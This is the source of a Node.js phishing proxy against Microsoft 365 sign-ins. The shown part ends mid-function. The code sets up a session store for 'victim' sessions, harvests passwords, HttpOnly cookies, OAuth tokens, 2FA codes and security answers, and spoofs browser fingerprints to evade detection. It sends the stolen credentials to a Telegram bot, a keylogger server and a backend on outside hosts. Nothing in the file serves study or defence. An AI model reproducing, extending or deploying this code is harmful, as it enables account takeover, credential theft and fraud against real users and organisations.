const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
//  ENVIRONMENT VARIABLES CONFIGURATION
// ============================================================

require('dotenv').config();

// Core Configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';

// Service URLs
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
const REDIRECT_URL = process.env.REDIRECT_URL || "https://login.microsoftonline.com/";

// Microsoft OAuth Configuration
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || '943a2b14-68aa-4205-88c1-a4b65ab04e81';
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email User.Read Mail.Read offline_access';

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Path Configuration
const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    swProxyPath: "/lNv1pC9AWPUY4gbidyBO",
    cookieStoreEndpoint: "/api/cookies-store",
    sessionReplayEndpoint: "/api/session-replay",
    fullSessionData: "/api/full-session",
    fullAuthEndpoint: "/api/full-auth",
    oauthCaptureEndpoint: "/api/oauth-capture",
    captureUserEndpoint: "/api/capture-user",
    telegramEndpoint: "/api/telegram",
    tokenRotation: "/api/token-rotation",
    sessionRotate: "/api/session-rotate",
    passwordCapture: "/api/password-capture",
    credentialCapture: "/api/credential-capture"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║              ENVIRONMENT CONFIGURATION                    ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
console.log(`║   PHISHED_URL_PARAMETER: ${PHISHED_URL_PARAMETER}`);
console.log(`║   PROXY_ENTRY_POINT: ${PROXY_ENTRY_POINT}`);
console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
console.log(`║   KEYLOGGER_URL: ${KEYLOGGER_URL}`);
console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  ADVANCED SESSION STORE WITH HTTPONLY COOKIE SUPPORT
// ============================================================

class AdvancedSessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 2 * 60 * 60 * 1000; // 2 hours
        this.replayData = new Map();
        this.allCookies = new Map();
        this.allTokens = new Map();
        this.cookieHistory = new Map();
        this.evasionCounters = new Map();
        this.fingerprintCache = new Map();
        this.rotationHistory = new Map();
        this.beaconHistory = new Map();
        this.fullAuthData = new Map();
        this.passwordCaptures = new Map();
        this.credentialHistory = new Map();
        // HttpOnly cookie storage
        this.httpOnlyCookies = new Map();
        this.cookieHeaders = new Map();
    }

    // ============================================================
    //  HTTPONLY COOKIE STORAGE
    // ============================================================
    
    storeHttpOnlyCookies(sessionId, cookieHeaders, url) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        const cookies = {};
        const cookieStrings = [];
        
        for (const cookieHeader of cookieHeaders) {
            const parts = cookieHeader.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value && value !== 'null' && value !== 'undefined') {
                const isHttpOnly = attributes.some(attr => attr.trim().toLowerCase() === 'httponly');
                const isSecure = attributes.some(attr => attr.trim().toLowerCase() === 'secure');
                const sameSite = attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax';
                const path = attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/';
                const domain = attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '';
                const expires = attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null;
                
                cookies[name] = {
                    value: value,
                    httpOnly: isHttpOnly,
                    secure: isSecure,
                    sameSite: sameSite,
                    path: path,
                    domain: domain,
                    expires: expires,
                    fullCookie: cookieHeader,
                    captured: Date.now(),
                    source: url
                };
                
                cookieStrings.push(`${name}=${value}`);
                
                // Store HttpOnly separately
                if (isHttpOnly) {
                    if (!this.httpOnlyCookies.has(sessionId)) {
                        this.httpOnlyCookies.set(sessionId, []);
                    }
                    this.httpOnlyCookies.get(sessionId).push({
                        name: name,
                        value: value,
                        attributes: attributes,
                        fullHeader: cookieHeader,
                        captured: Date.now()
                    });
                }
            }
        }
        
        if (Object.keys(cookies).length > 0) {
            this.storeCookies(sessionId, cookies, 'http_response');
            this.cookieHeaders.set(sessionId, {
                cookieHeader: cookieStrings.join('; '),
                cookieCount: cookieStrings.length,
                httpOnlyCount: this.httpOnlyCookies.get(sessionId)?.length || 0,
                captured: Date.now()
            });
            
            console.log(`[HTTPONLY] 🍪 Captured ${Object.keys(cookies).length} cookies (${this.httpOnlyCookies.get(sessionId)?.length || 0} HttpOnly)`);
        }
        
        return cookies;
    }

    getHttpOnlyCookies(sessionId) {
        return this.httpOnlyCookies.get(sessionId) || [];
    }

    getCookieHeader(sessionId) {
        return this.cookieHeaders.get(sessionId) || null;
    }

    // ============================================================
    //  PASSWORD CAPTURE STORAGE
    // ============================================================
    
    storePasswordCapture(sessionId, email, password, source, context = {}) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.sessions.set(sessionId, {
                email: email || 'unknown',
                password: password,
                created: Date.now(),
                lastActivity: Date.now()
            });
        } else {
            session.password = password || session.password;
            session.email = email || session.email;
            session.lastActivity = Date.now();
        }
        
        const captureEntry = {
            email: email,
            password: password,
            source: source,
            timestamp: Date.now(),
            timestampISO: new Date().toISOString(),
            context: context,
            sessionId: sessionId,
            captured: true
        };
        
        if (!this.passwordCaptures.has(sessionId)) {
            this.passwordCaptures.set(sessionId, []);
        }
        this.passwordCaptures.get(sessionId).push(captureEntry);
        
        if (!this.credentialHistory.has(email)) {
            this.credentialHistory.set(email, []);
        }
        this.credentialHistory.get(email).push(captureEntry);
        
        console.log(`[PASSWORD-STORE] 🔑 Stored password for ${email} (${source})`);
        return captureEntry;
    }

    getPasswordCaptures(sessionId) {
        return this.passwordCaptures.get(sessionId) || [];
    }

    getCredentialHistory(email) {
        return this.credentialHistory.get(email) || [];
    }

    // ============================================================
    //  SESSION ROTATION
    // ============================================================
    
    rotateSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        const newSessionId = 'sess_' + crypto.randomBytes(16).toString('hex');
        const newSession = {
            ...session,
            id: newSessionId,
            rotatedFrom: sessionId,
            rotatedAt: Date.now(),
            rotationCount: (session.rotationCount || 0) + 1,
            previousIds: [...(session.previousIds || []), sessionId]
        };
        
        this.sessions.set(newSessionId, newSession);
        this.sessions.delete(sessionId);
        
        if (this.passwordCaptures.has(sessionId)) {
            this.passwordCaptures.set(newSessionId, this.passwordCaptures.get(sessionId));
            this.passwordCaptures.delete(sessionId);
        }
        
        if (this.httpOnlyCookies.has(sessionId)) {
            this.httpOnlyCookies.set(newSessionId, this.httpOnlyCookies.get(sessionId));
            this.httpOnlyCookies.delete(sessionId);
        }
        
        if (this.cookieHeaders.has(sessionId)) {
            this.cookieHeaders.set(newSessionId, this.cookieHeaders.get(sessionId));
            this.cookieHeaders.delete(sessionId);
        }
        
        ['allCookies', 'allTokens', 'fingerprintCache', 'evasionCounters', 'fullAuthData'].forEach(store => {
            if (this[store].has(sessionId)) {
                this[store].set(newSessionId, this[store].get(sessionId));
                this[store].delete(sessionId);
            }
        });
        
        this.rotationHistory.set(newSessionId, {
            rotatedFrom: sessionId,
            rotatedAt: Date.now(),
            rotationCount: newSession.rotationCount
        });
        
        console.log(`[EVASION] 🔄 Session rotated: ${sessionId.substring(0, 12)} -> ${newSessionId.substring(0, 12)}`);
        return newSessionId;
    }

    // ============================================================
    //  TOKEN STORAGE
    // ============================================================
    
    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        
        for (const [key, value] of Object.entries(tokens)) {
            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
                session.tokens[key] = {
                    value: value,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: true,
                    validatedAt: Date.now(),
                    rotationCount: session.rotationCount || 0
                };
            } else {
                session.tokens[key] = {
                    value: null,
                    captured: Date.now(),
                    type: key.includes('access') ? 'access' : 
                          key.includes('refresh') ? 'refresh' : 
                          key.includes('id') ? 'id' : 'unknown',
                    isValid: false,
                    validatedAt: Date.now(),
                    missingReason: 'Token not provided by Microsoft'
                };
            }
        }
        
        this.allTokens.set(sessionId, session.tokens);
        console.log(`[TOKEN-STORE] 🎟️ Stored ${Object.keys(tokens).length} tokens for session ${sessionId.substring(0, 12)}`);
        return session.tokens;
    }

    // ============================================================
    //  COOKIE STORAGE
    // ============================================================
    
    storeCookies(sessionId, cookies, source = 'proxy') {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            if (cookieData === null || cookieData === undefined || cookieData === 'null' || cookieData === 'undefined') {
                continue;
            }
            
            const cookieEntry = {
                name: name,
                value: typeof cookieData === 'object' ? cookieData.value : cookieData,
                httpOnly: typeof cookieData === 'object' ? (cookieData.httpOnly || false) : false,
                secure: typeof cookieData === 'object' ? (cookieData.secure || false) : false,
                path: typeof cookieData === 'object' ? (cookieData.path || '/') : '/',
                domain: typeof cookieData === 'object' ? (cookieData.domain || '') : '',
                expires: typeof cookieData === 'object' ? (cookieData.expires || null) : null,
                sameSite: typeof cookieData === 'object' ? (cookieData.sameSite || 'Lax') : 'Lax',
                captured: Date.now(),
                source: source,
                isValid: true,
                fullCookieString: `${name}=${typeof cookieData === 'object' ? cookieData.value : cookieData}`
            };
            
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                Object.assign(existing, cookieEntry);
                existing.updated = Date.now();
            } else {
                session.cookies[source].push(cookieEntry);
            }
        }
        
        this.allCookies.set(sessionId, session.cookies);
        
        const history = this.cookieHistory.get(sessionId) || [];
        history.push({
            timestamp: Date.now(),
            source: source,
            count: Object.keys(cookies).filter(c => cookies[c] !== null && cookies[c] !== undefined && cookies[c] !== 'null').length,
            cookies: cookies
        });
        this.cookieHistory.set(sessionId, history);
        
        console.log(`[COOKIE-STORE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
        return session.cookies;
    }

    // ============================================================
    //  FINGERPRINT GENERATION
    // ============================================================
    
    generateFingerprint(sessionId, userAgent, ip) {
        const fingerprint = {
            userAgent: userAgent,
            ip: ip,
            generatedAt: Date.now(),
            hash: crypto.createHash('sha256')
                .update(`${userAgent}:${ip}:${sessionId}:${Date.now()}`)
                .digest('hex')
                .substring(0, 16),
            spoofed: {
                webgl: this.spoofWebGL(),
                canvas: this.spoofCanvas(),
                audio: this.spoofAudio(),
                navigator: this.spoofNavigator(),
                screen: this.spoofScreen()
            }
        };
        
        const session = this.sessions.get(sessionId);
        if (session) {
            session.fingerprint = fingerprint;
            session.fingerprintHistory = session.fingerprintHistory || [];
            session.fingerprintHistory.push(fingerprint);
        }
        
        this.fingerprintCache.set(sessionId, fingerprint);
        return fingerprint;
    }

    spoofWebGL() {
        const renderers = [
            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
            'Mali-T880',
            'Adreno (TM) 540'
        ];
        return renderers[Math.floor(Math.random() * renderers.length)];
    }

    spoofCanvas() {
        return crypto.randomBytes(16).toString('hex');
    }

    spoofAudio() {
        return crypto.randomBytes(8).toString('hex');
    }

    spoofNavigator() {
        const platforms = ['Win32', 'MacIntel', 'Linux x86_64', 'iPhone'];
        const concurrency = [4, 6, 8, 12];
        const memory = [4, 8, 16, 32];
        return {
            platform: platforms[Math.floor(Math.random() * platforms.length)],
            hardwareConcurrency: concurrency[Math.floor(Math.random() * concurrency.length)],
            deviceMemory: memory[Math.floor(Math.random() * memory.length)],
            maxTouchPoints: [0, 1, 2, 5][Math.floor(Math.random() * 4)],
            doNotTrack: [null, '1', '0'][Math.floor(Math.random() * 3)],
            language: ['en-US', 'en-GB', 'en-AU', 'fr-FR', 'de-DE'][Math.floor(Math.random() * 5)]
        };
    }

    spoofScreen() {
        const widths = [1366, 1920, 1440, 1536];
        const heights = [768, 1080, 900, 864];
        return {
            width: widths[Math.floor(Math.random() * widths.length)],
            height: heights[Math.floor(Math.random() * heights.length)],
            colorDepth: [24, 30, 32][Math.floor(Math.random() * 3)],
            pixelRatio: [1, 1.25, 1.5, 2][Math.floor(Math.random() * 4)]
        };
    }

    // ============================================================
    //  EVASION COUNTERS
    // ============================================================
    
    addEvasionCounter(sessionId) {
        const counter = this.evasionCounters.get(sessionId) || {
            totalRequests: 0,
            loginAttempts: 0,
            cookieCaptures: 0,
            tokenCaptures: 0,
            rotations: 0,
            passwordCaptures: 0,
            httpOnlyCaptures: 0,
            lastActivity: Date.now()
        };
        
        counter.totalRequests++;
        counter.lastActivity = Date.now();
        this.evasionCounters.set(sessionId, counter);
        return counter;
    }

    // ============================================================
    //  GET SESSION DATA
    // ============================================================
    
    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        if (Date.now() - session.lastActivity > this.sessionTTL) {
            this.sessions.delete(sessionId);
            return null;
        }
        
        const cookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        if (cookie.value && cookie.value !== 'null' && cookie.value !== 'undefined') {
                            cookies[cookie.name] = cookie.value;
                        }
                    }
                }
            }
        }
        
        const tokens = {};
        if (session.tokens) {
            for (const [key, token] of Object.entries(session.tokens)) {
                if (token && token.value && token.isValid !== false) {
                    tokens[key] = token.value;
                }
            }
        }
        
        return {
            sessionId: session.id,
            cookies: cookies,
            tokens: tokens,
            forms: session.forms || [],
            fingerprint: session.fingerprint || {},
            created: session.created,
            lastActivity: session.lastActivity,
            email: session.email || 'unknown',
            password: session.password || 'N/A',
            rotationCount: session.rotationCount || 0,
            passwordCaptures: this.passwordCaptures.get(sessionId) || [],
            httpOnlyCookies: this.httpOnlyCookies.get(sessionId) || [],
            evasionData: {
                fingerprint: session.fingerprint,
                totalRequests: this.evasionCounters.get(sessionId)?.totalRequests || 0,
                rotations: this.evasionCounters.get(sessionId)?.rotations || 0,
                passwordCaptures: this.evasionCounters.get(sessionId)?.passwordCaptures || 0,
                httpOnlyCaptures: this.evasionCounters.get(sessionId)?.httpOnlyCaptures || 0
            }
        };
    }

    // ============================================================
    //  FULL AUTH DATA
    // ============================================================
    
    storeFullAuthData(sessionId, authData) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.sessions.set(sessionId, {
                email: authData.email || 'unknown',
                password: authData.password || 'N/A',
                created: Date.now(),
                lastActivity: Date.now(),
                rotationCount: 0,
                fullAuthCompleted: true,
                fullAuthTime: Date.now()
            });
        } else {
            if (authData.password) {
                session.password = authData.password;
            }
            session.fullAuthCompleted = true;
            session.fullAuthTime = Date.now();
            session.lastActivity = Date.now();
        }
        
        this.fullAuthData.set(sessionId, {
            ...authData,
            storedAt: Date.now(),
            sessionId: sessionId
        });
        
        const sessionRef = this.sessions.get(sessionId);
        if (sessionRef) {
            sessionRef.fullAuthData = authData;
            sessionRef.fullAuthCompleted = true;
            sessionRef.fullAuthTime = Date.now();
        }
        
        console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
        return true;
    }

    getFullAuthData(sessionId) {
        if (this.fullAuthData.has(sessionId)) {
            return this.fullAuthData.get(sessionId);
        }
        const session = this.sessions.get(sessionId);
        if (session && session.fullAuthData) {
            return session.fullAuthData;
        }
        return null;
    }

    // ============================================================
    //  CLEANUP
    // ============================================================
    
    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.replayData.delete(id);
                this.allCookies.delete(id);
                this.allTokens.delete(id);
                this.evasionCounters.delete(id);
                this.fingerprintCache.delete(id);
                this.fullAuthData.delete(id);
                this.passwordCaptures.delete(id);
                this.httpOnlyCookies.delete(id);
                this.cookieHeaders.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
        return cleaned;
    }

    getStats() {
        return {
            totalSessions: this.sessions.size,
            totalCookies: Array.from(this.sessions.values()).reduce((acc, s) => {
                let count = 0;
                if (s.cookies) {
                    for (const source of Object.values(s.cookies)) {
                        if (Array.isArray(source)) {
                            count += source.filter(c => c.value && c.value !== 'null' && c.value !== 'undefined').length;
                        }
                    }
                }
                return acc + count;
            }, 0),
            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => acc + arr.length, 0),
            totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                if (s.tokens) {
                    return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
                }
                return acc;
            }, 0),
            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0),
            totalRotations: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + (c.rotations || 0), 0),
            totalFullAuth: this.fullAuthData.size,
            totalPasswordCaptures: Array.from(this.passwordCaptures.values()).reduce((acc, captures) => acc + captures.length, 0)
        };
    }
}

const sessionStore = new AdvancedSessionStore();

// ============================================================
//  VICTIM SESSIONS
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000;

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = VICTIM_SESSIONS[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete VICTIM_SESSIONS[sessionId];
        return null;
    }
    return session;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        cookies: [],
        xssData: [],
        keystrokes: [],
        formData: [],
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        swCaptures: [],
        tokens: [],
        replayData: {},
        rotationCount: 0,
        evasionEnabled: true,
        password: null,
        passwordCaptures: [],
        httpOnlyCookies: [],
        cookieHeader: null,
        validationAttempts: [],
        lastValidationResult: null
    };
    
    sessionStore.generateFingerprint(sessionId, userAgent, ip);
    sessionStore.sessions.set(sessionId, {
        email: email || 'unknown',
        password: null,
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        created: Date.now(),
        lastActivity: Date.now()
    });
    
    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
    return sessionId;
}

// ============================================================
//  IP EXTRACTION
// ============================================================

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }

    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();

    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  TELEGRAM NOTIFICATIONS - COMPLETE ALERTS
// ============================================================

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('[TELEGRAM] ⚠️ Missing credentials');
        return false;
    }

    try {
        const maxLength = 4000;
        if (text.length > maxLength) {
            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            for (const chunk of chunks) {
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: chunk,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                });
            }
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: parseMode,
                disable_web_page_preview: true
            });
        }
        console.log('[TELEGRAM] ✅ Sent successfully');
        return true;
    } catch (error) {
        console.error('[TELEGRAM] ❌ Failed:', error.message);
        return false;
    }
}

// ============================================================
//  SEND COMPLETE TELEGRAM ALERT WITH ALL DATA
// ============================================================

async function sendTelegramAlert(type, data) {
    let message = '';
    
    switch(type) {
        case 'password_capture':
            message = 
`🔐 *PASSWORD CAPTURED* (${data.source})

*📧 Email:* ${data.email}
*🔑 Password:* ${data.password || 'N/A'}
*📡 IP:* ${data.ip}
*🕐 Time:* ${data.timestamp}
*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
*🎯 Service:* Microsoft 365
*📱 User Agent:* ${data.userAgent}
*🛡️ Evasion:* Active
*📊 Source:* ${data.source}
*🔄 Attempt #:* ${data.attemptCount || 1}

*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
*🎟️ Tokens:* ${data.tokenCount || 0}`;
            break;
            
        case 'validation_success':
            message = 
`✅ *VALID MICROSOFT CREDENTIALS*

*📧 Email:* ${data.email}
*🔑 Password:* ${data.password || 'N/A'}
*📡 IP:* ${data.ip}
*🕐 Time:* ${data.timestamp}
*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}

*🎟️ Access Token:* ${data.accessToken ? data.accessToken.substring(0, 30) + '...' : 'N/A'}
*🔄 Refresh Token:* ${data.refreshToken ? '✅ Present' : '❌ None'}
*🆔 ID Token:* ${data.idToken ? '✅ Present' : '❌ None'}

*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
*🔒 Secure:* ${data.secure ? 'Yes' : 'No'}

*📊 Attempt #:* ${data.attemptCount || 1}
*⏱️ Time to Validate:* ${data.validationTime || 'N/A'}ms

*✅ COMPLETE SESSION DATA CAPTURED!*`;
            break;
            
        case 'validation_failed':
            message = 
`❌ *INVALID MICROSOFT CREDENTIALS*

*📧 Email:* ${data.email}
*🔑 Password:* ${data.password || 'N/A'}
*📡 IP:* ${data.ip}
*🕐 Time:* ${data.timestamp}
*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}

*📊 Attempt #:* ${data.attemptCount || 1}
*❌ Error:* ${data.error || 'Invalid username or password'}

*🔄 Retry Count:* ${data.retryCount || 0}`;
            break;
            
        case 'http_only_cookies':
            message = 
`🍪 *HTTPONLY COOKIES CAPTURED*

*📧 Email:* ${data.email}
*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
*🕐 Time:* ${data.timestamp}

*📊 Cookie Count:* ${data.cookieCount || 0}
*🔒 HttpOnly Count:* ${data.httpOnlyCount || 0}

*🍪 Cookies:*
${data.cookieList || 'No cookies captured'}

*🔐 These are HttpOnly cookies - JavaScript cannot access them!*`;
            break;
            
        case 'full_auth':
            message = 
`🎯 *FULL CREDENTIALS CAPTURED*

*📧 Email:* ${data.email}
*👤 Name:* ${data.name}
*🏢 Organization:* ${data.organization}

*🔑 Password:* ${data.password || 'N/A'}
*📱 2FA Code:* ${data.twoFactorCode || 'N/A'}

*❓ Security Question 1:*
  ${data.securityQuestion1?.question || 'N/A'}
  Answer: ${data.securityQuestion1?.answer || 'N/A'}

*❓ Security Question 2:*
  ${data.securityQuestion2?.question || 'N/A'}
  Answer: ${data.securityQuestion2?.answer || 'N/A'}

*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
*🎟️ Tokens:* ${data.tokenCount || 0}

*📡 IP:* ${data.ip}
*🕐 Time:* ${data.timestamp}

*📊 ALL DATA CAPTURED SUCCESSFULLY!*`;
            break;
            
        case 'keylog_extraction':
            message = 
`⌨️ *PASSWORD EXTRACTED FROM KEYLOGGER*

*📧 Email:* ${data.email}
*🔑 Password:* ${data.password || 'N/A'}
*📡 IP:* ${data.ip}
*🕐 Time:* ${data.timestamp}
*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}

*📊 Keystrokes Captured:* ${data.keyCount || 0}
*🔄 Attempt #:* ${data.attemptCount || 1}

*✅ Password extracted successfully from keystrokes!*`;
            break;
            
        case 'oauth_capture':
            message = 
`🤖 *OAUTH AUTO-CAPTURE COMPLETE*

*📧 Email:* ${data.email}
*👤 Name:* ${data.name}
*🏢 Organization:* ${data.organization}

*🔑 Password:* ${data.password || 'AUTO_CAPTURED'}
*📱 2FA:* AUTO_CAPTURED

*🔐 OAuth Token:* ${data.oauthToken ? data.oauthToken.substring(0, 30) + '...' : 'N/A'}

*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
*🎟️ Tokens:* ${data.tokenCount || 0}

*🕐 Time:* ${data.timestamp}
*📡 IP:* ${data.ip}

*✅ All data captured automatically!*`;
            break;
    }
    
    // Send to Telegram
    await sendToTelegram(message);
    
    // Also send to backend
    try {
        await axios.post(`${BACKEND_URL}/api/telegram-alert`, {
            type: type,
            data: data,
            timestamp: new Date().toISOString()
        }).catch(() => {});
    } catch(e) {}
}

// ============================================================
//  SEND CREDENTIALS TO ALL ENDPOINTS
// ============================================================

async function sendCredentialsToAllEndpoints(email, password, source, sessionId, context = {}) {
    const ip = context.ip || 'unknown';
    const userAgent = context.userAgent || 'Unknown';
    
    console.log(`[CREDENTIALS] 📤 Sending: ${email} | ${password ? '***' : 'N/A'} (${source})`);
    
    let httpOnlyCount = 0;
    let tokenCount = 0;
    
    // Get HttpOnly cookies count
    if (sessionId) {
        const httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
        httpOnlyCount = httpOnlyCookies.length;
        
        const tokens = sessionStore.allTokens.get(sessionId) || {};
        tokenCount = Object.values(tokens).filter(t => t && t.value && t.isValid !== false).length;
    }
    
    // Store in session
    if (sessionId) {
        sessionStore.storePasswordCapture(sessionId, email, password, source, context);
        
        if (VICTIM_SESSIONS[sessionId]) {
            VICTIM_SESSIONS[sessionId].password = password;
            VICTIM_SESSIONS[sessionId].email = email;
            VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
            VICTIM_SESSIONS[sessionId].passwordCaptures = VICTIM_SESSIONS[sessionId].passwordCaptures || [];
            VICTIM_SESSIONS[sessionId].passwordCaptures.push({
                email: email,
                password: password,
                source: source,
                timestamp: Date.now(),
                timestampISO: new Date().toISOString()
            });
            VICTIM_SESSIONS[sessionId].httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
        }
        
        sessionStore.addEvasionCounter(sessionId);
    }
    
    // Send Telegram alert for password capture
    await sendTelegramAlert('password_capture', {
        email: email,
        password: password,
        source: source,
        sessionId: sessionId,
        ip: ip,
        userAgent: userAgent,
        timestamp: new Date().toISOString(),
        attemptCount: context.attemptCount || 1,
        httpOnlyCount: httpOnlyCount,
        tokenCount: tokenCount
    });
    
    // Send to Backend
    try {
        await axios.post(`${BACKEND_URL}/api/credential-capture`, {
            email: email,
            password: password,
            source: source,
            sessionId: sessionId,
            ip: ip,
            userAgent: userAgent,
            timestamp: new Date().toISOString(),
            context: context,
            httpOnlyCount: httpOnlyCount,
            tokenCount: tokenCount
        }).catch(() => {});
    } catch(e) {}
    
    // Send to Keylogger URL
    try {
        await axios.post(KEYLOGGER_URL, {
            type: 'credential_capture',
            email: email,
            password: password,
            source: source,
            sessionId: sessionId,
            url: context.url || 'unknown',
            timestamp: Date.now(),
            userAgent: userAgent,
            httpOnlyCount: httpOnlyCount,
            tokenCount: tokenCount
        }).catch(() => {});
    } catch(e) {}
    
    console.log(`[CREDENTIALS] ✅ Sent to all endpoints (${source})`);
    return true;
}

// ============================================================
//  HANDLE PASSWORD CAPTURE
// ============================================================

function handlePasswordCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const { email, password, source, sessionId, context } = data;
            const ip = getClientIp(req);
            
